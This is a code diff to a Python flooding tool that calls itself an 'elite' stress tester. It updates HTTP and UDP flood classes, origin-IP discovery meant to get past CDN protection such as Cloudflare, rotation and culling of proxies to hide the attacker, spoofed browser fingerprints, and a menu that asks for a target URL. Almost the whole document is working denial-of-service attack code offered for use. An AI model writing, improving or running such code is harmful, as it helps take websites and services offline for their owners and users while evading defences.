@@ -12,22 +12,21 @@ import requests
 import urllib3
 import json
 import hashlib
+import ssl
 from urllib.parse import urlparse, urljoin
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from queue import Queue
 from datetime import datetime
 
-# Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# ============= CONFIGURATION =============
 class Config:
     proxies = []
     proxy_index = 0
     proxy_lock = threading.Lock()
+    bad_proxies = set()
     debug = False
     
-    # Statistics
     stats = {
         'total_requests': 0,
         'successful': 0,
@@ -41,7 +40,6 @@ class Config:
 
 config = Config()
 
-# ============= BANNER =============
 BANNER = """
 ╔══════════════════════════════════════════════════════════╗
 ║        ADVANCED STRESS TESTER V3.0 - ELITE EDITION      ║
@@ -49,7 +47,6 @@ BANNER = """
 ╚══════════════════════════════════════════════════════════╝
 """
 
-# ============= BROWSER FINGERPRINTS =============
 BROWSER_PROFILES = [
     {
         'name': 'Chrome Windows',
@@ -77,35 +74,84 @@ BROWSER_PROFILES = [
     }
 ]
 
-# ============= PROXY MANAGEMENT =============
+def test_proxy(proxy_url, timeout=5):
+    """Test if a proxy is working"""
+    try:
+        test_urls = ['http://1.1.1.1', 'http://8.8.8.8']
+        session = requests.Session()
+        session.verify = False
+        session.proxies = {'http': proxy_url, 'https': proxy_url}
+        
+        for url in test_urls:
+            try:
+                response = session.get(url, timeout=timeout)
+                if response.status_code in [200, 301, 302, 403, 404]:
+                    return True
+            except:
+                continue
+        return False
+    except:
+        return False
+
 def load_proxies(file_path='proxies.txt'):
     """Load and validate proxies from file"""
     try:
         with open(file_path, 'r') as f:
             raw = [line.strip() for line in f if line.strip() and not line.startswith('#')]
             
+        print(f"[*] Loading {len(raw)} proxies...")
+        
+        temp_proxies = []
         for proxy in raw:
             if not proxy.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
                 proxy = f'http://{proxy}'
-            config.proxies.append(proxy)
+            temp_proxies.append(proxy)
         
-        print(f"[+] Loaded {len(config.proxies)} proxies")
+        validate = input(f"[?] Validate proxies before use? (slower but removes dead proxies) (y/n): ").strip().lower()
+        
+        if validate == 'y':
+            print("[*] Testing proxies (this may take a while)...")
+            from concurrent.futures import ThreadPoolExecutor
+            with ThreadPoolExecutor(max_workers=50) as executor:
+                results = list(executor.map(lambda p: (p, test_proxy(p, timeout=3)), temp_proxies))
+            
+            config.proxies = [p for p, valid in results if valid]
+            print(f"[+] Loaded {len(config.proxies)} working proxies (removed {len(temp_proxies) - len(config.proxies)} dead)")
+        else:
+            config.proxies = temp_proxies
+            print(f"[+] Loaded {len(config.proxies)} proxies (not validated)")
+        
         return len(config.proxies) > 0
     except FileNotFoundError:
         print("[!] proxies.txt not found")
         return False
 
 def get_proxy():
-    """Get next proxy with rotation"""
+    """Get next proxy with rotation, skipping bad ones"""
     if not config.proxies:
         return None
     
     with config.proxy_lock:
-        proxy = config.proxies[config.proxy_index % len(config.proxies)]
-        config.proxy_index += 1
-        return {'http': proxy, 'https': proxy}
+        attempts = 0
+        max_attempts = len(config.proxies)
+        
+        while attempts < max_attempts:
+            proxy = config.proxies[config.proxy_index % len(config.proxies)]
+            config.proxy_index += 1
+            
+            if proxy not in config.bad_proxies:
+                return {'http': proxy, 'https': proxy}
+            
+            attempts += 1
+        
+        return None
 
-# ============= ADVANCED HEADERS =============
+def mark_proxy_bad(proxy_dict):
+    """Mark a proxy as bad"""
+    if proxy_dict:
+        with config.proxy_lock:
+            config.bad_proxies.add(proxy_dict.get('http', ''))
+
 def get_advanced_headers(url, referer=None, profile=None):
     """Generate advanced browser-like headers with anti-fingerprinting"""
     if not profile:
@@ -127,7 +173,6 @@ def get_advanced_headers(url, referer=None, profile=None):
         'Pragma': 'no-cache',
     }
     
-    # Add Chrome-specific headers
     if 'sec_ch_ua' in profile:
         headers['sec-ch-ua'] = profile['sec_ch_ua']
         headers['sec-ch-ua-mobile'] = '?0'
@@ -136,19 +181,16 @@ def get_advanced_headers(url, referer=None, profile=None):
     if referer:
         headers['Referer'] = referer
     
-    # Random additional headers to avoid fingerprinting
     if random.random() > 0.5:
         headers['X-Requested-With'] = 'XMLHttpRequest'
     
     return headers
 
-# ============= ORIGIN IP DISCOVERY =============
 def discover_origin_ips(domain):
     """Advanced origin IP discovery with multiple techniques"""
     print(f"[*] Discovering origin IPs for {domain}...")
     found_ips = set()
     
-    # Method 1: Common subdomain enumeration
     subdomains = [
         'direct', 'origin', 'direct-connect', 'direct-origin',
         'dev', 'staging', 'test', 'beta', 'alpha',
@@ -164,19 +206,17 @@ def discover_origin_ips(domain):
             test_domain = f"{sub}.{domain}"
             ip = socket.gethostbyname(test_domain)
             
-            # Filter out known CDN IP ranges
             if not ip.startswith((
-                '104.', '172.', '162.', '2606:', '2803:', '2405:', '2a06:',  # Cloudflare
-                '13.', '34.', '35.', '54.', '52.',  # AWS CloudFront
-                '23.', '95.', '96.',  # Akamai
-                '151.', '2a02:',  # Fastly
+                '104.', '172.', '162.', '2606:', '2803:', '2405:', '2a06:',
+                '13.', '34.', '35.', '54.', '52.',
+                '23.', '95.', '96.',
+                '151.', '2a02:',
             )):
                 found_ips.add(ip)
                 print(f"  [+] Found: {test_domain} -> {ip}")
         except:
             pass
     
-    # Method 2: Check main domain
     try:
         main_ip = socket.gethostbyname(domain)
         found_ips.add(main_ip)
@@ -190,17 +230,14 @@ def discover_origin_ips(domain):
         print("[!] No origin IPs found, using domain directly")
         return [domain]
 
-# ============= URL VALIDATION =============
 def validate_url(url):
     """Validate and fix URL format"""
     url = url.strip()
     
-    # Add protocol if missing
     if not url.startswith(('http://', 'https://')):
         url = 'https://' + url
         print(f"[*] Added HTTPS protocol: {url}")
     
-    # Validate URL structure
     try:
         parsed = urlparse(url)
         if not parsed.hostname:
@@ -209,7 +246,6 @@ def validate_url(url):
     except Exception as e:
         raise ValueError(f"Invalid URL: {e}")
 
-# ============= CACHE BUSTING =============
 def add_cache_buster(url):
     """Add cache-busting parameters"""
     separator = '&' if '?' in url else '?'
@@ -220,7 +256,6 @@ def add_cache_buster(url):
     ]
     return url + separator + random.choice(params)
 
-# ============= STATISTICS =============
 def update_stats(success=False, status_code=None, bytes_sent=0, bytes_received=0):
     """Update global statistics"""
     with config.stats_lock:
@@ -250,8 +285,6 @@ def display_stats():
         codes = ', '.join([f"{k}:{v}" for k, v in sorted(config.stats['status_codes'].items())])
         print(f"[STATS] Status Codes: {codes}")
     print(f"{'='*70}")
-
-# ============= ATTACK METHODS =============
 
 class HTTPFlood:
     """Advanced HTTP Flood with CF bypass"""
@@ -285,41 +318,53 @@ class HTTPFlood:
         session = requests.Session()
         session.verify = False
         
-        # Connection pooling with better settings
         adapter = requests.adapters.HTTPAdapter(
-            pool_connections=3,
-            pool_maxsize=5,
+            pool_connections=2,
+            pool_maxsize=3,
             max_retries=0,
             pool_block=False
         )
         session.mount('http://', adapter)
         session.mount('https://', adapter)
         
+        import warnings
+        warnings.filterwarnings('ignore', message='Unverified HTTPS request')
+        
         end_time = time.time() + self.duration
         local_count = 0
+        current_proxy = None
+        proxy_fails = 0
         
         while self.running and time.time() < end_time:
             try:
-                # Rotate proxy
-                if config.proxies:
-                    session.proxies = get_proxy()
+                if config.proxies and (current_proxy is None or proxy_fails >= 3):
+                    current_proxy = get_proxy()
+                    if current_proxy:
+                        session.proxies = current_proxy
+                        proxy_fails = 0
+                    else:
+                        if config.debug:
+                            print("[DEBUG] No working proxies available")
+                        time.sleep(1)
+                        continue
                 
-                # Generate headers
                 profile = random.choice(BROWSER_PROFILES)
                 headers = get_advanced_headers(self.url, referer=self.url, profile=profile)
                 
-                # Target URL (with origin IP if available)
                 target_url = self.url
+                use_http = False
                 if self.origin_ips and self.use_origin:
                     origin_ip = random.choice(self.origin_ips)
-                    target_url = self.url.replace(self.domain, origin_ip)
-                    headers['Host'] = self.domain
+                    if origin_ip != self.domain:
+                        target_url = self.url.replace('https://', 'http://').replace(self.domain, origin_ip)
+                        use_http = True
+                        headers['Host'] = self.domain
+                    else:
+                        target_url = self.url
                 
-                # Add cache buster
                 target_url = add_cache_buster(target_url)
                 
-                # Send request with adaptive timeout
-                timeout = 10 if config.proxies else 5
+                timeout = 15 if config.proxies else 5
                 
                 if self.method == 'GET':
                     response = session.get(target_url, headers=headers, timeout=timeout, allow_redirects=False)
@@ -329,7 +374,6 @@ class HTTPFlood:
                 elif self.method == 'HEAD':
                     response = session.head(target_url, headers=headers, timeout=timeout, allow_redirects=False)
                 
-                # Update stats
                 update_stats(
                     success=True,
                     status_code=response.status_code,
@@ -337,45 +381,49 @@ class HTTPFlood:
                     bytes_received=len(response.content)
                 )
                 
+                proxy_fails = 0
                 local_count += 1
                 
                 if config.debug and local_count % 10 == 0:
                     print(f"[DEBUG] Thread {threading.current_thread().name}: {local_count} requests | Status: {response.status_code}")
                 
-            except (requests.exceptions.ConnectionError, 
-                    requests.exceptions.ProxyError,
-                    requests.exceptions.Timeout,
-                    requests.exceptions.TooManyRedirects) as e:
+            except (requests.exceptions.SSLError,
+                    requests.exceptions.ProxyError) as e:
                 update_stats(success=False)
+                proxy_fails += 1
+                
+                if current_proxy and proxy_fails >= 3:
+                    mark_proxy_bad(current_proxy)
+                    if config.debug:
+                        print(f"[DEBUG] Marked proxy as bad: {type(e).__name__}")
+                    current_proxy = None
+                
+                time.sleep(0.1)
+                
+            except (requests.exceptions.ConnectionError,
+                    requests.exceptions.Timeout,
+                    requests.exceptions.ReadTimeout) as e:
+                update_stats(success=False)
+                proxy_fails += 1
+                
                 if config.debug:
                     print(f"[DEBUG] Connection error: {type(e).__name__}")
-                # Recreate session on connection pool errors
-                try:
-                    session.close()
-                    session = requests.Session()
-                    session.verify = False
-                    adapter = requests.adapters.HTTPAdapter(
-                        pool_connections=3,
-                        pool_maxsize=5,
-                        max_retries=0,
-                        pool_block=False
-                    )
-                    session.mount('http://', adapter)
-                    session.mount('https://', adapter)
-                except:
-                    pass
-                time.sleep(0.1)  # Longer delay on error
+                
+                if current_proxy and proxy_fails >= 5:
+                    mark_proxy_bad(current_proxy)
+                    current_proxy = None
+                
+                time.sleep(0.2)
                 
             except Exception as e:
                 update_stats(success=False)
                 if config.debug:
                     print(f"[DEBUG] Error: {type(e).__name__}: {str(e)[:50]}")
-                time.sleep(0.05)
+                time.sleep(0.1)
             
             else:
-                time.sleep(0.005)  # Small delay on success
+                time.sleep(0.005)
         
-        # Cleanup
         try:
             session.close()
         except:
@@ -399,7 +447,6 @@ class HTTPFlood:
             
             self.running = False
             
-            # Wait for all threads
             for future in as_completed(futures, timeout=10):
                 pass
         
@@ -481,13 +528,11 @@ class UDPFlood:
         print(f"\n[+] UDP Flood completed!")
         print(f"[+] Total packets: {self.total_packets} | Rate: {rate:.0f} pkt/s | Bandwidth: {bandwidth:.2f} MB/s")
 
-# ============= MAIN MENU =============
 def main():
     global config
     
     print(BANNER)
     
-    # Configuration
     debug_input = input("[?] Enable debug mode? (y/n): ").strip().lower()
     config.debug = (debug_input == 'y')
     
@@ -507,7 +552,6 @@ def main():
     if choice in ['1', '2', '3', '5']:
         url = input("[>] Enter target URL (e.g., example.com or https://example.com): ").strip()
         
-        # Validate and fix URL
         try:
             url = validate_url(url)
         except ValueError as e:
@@ -530,7 +574,6 @@ def main():
             attack = HTTPFlood(url, duration, threads, method='HEAD', use_origin=use_origin)
             attack.start()
         elif choice == '5':
-            # Mixed attack
             print("[*] Running mixed GET+POST attack...")
             get_threads = threads // 2
             post_threads = threads - get_threads
